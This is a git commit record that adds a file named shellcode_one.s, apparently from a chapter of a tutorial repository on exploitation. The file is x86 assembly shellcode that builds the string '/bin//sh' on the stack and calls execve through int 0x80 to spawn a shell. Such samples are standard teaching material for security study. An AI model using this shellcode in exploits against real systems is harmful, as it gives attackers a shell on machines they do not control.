2d05e9411074de9042c52d20fdb879dd7e08d109
tipsiness <tipsiness@gmail.com>
2024-11-25 12:42:21 +0900

    Add files via upload

---
+++ ch09/shellcode_one.s
@@ -0,0 +1,19 @@
+section .text
+	global _start
+		_start:
+			xor eax, eax
+			push eax
+			push "//sh"
+			push "/bin"
+			mov ebx, esp
+
+			push eax
+			push ebx
+			mov ecx, esp
+
+			xor edx, edx
+
+			xor eax, eax
+			mov al, 0x0b
+			int 0x80
+
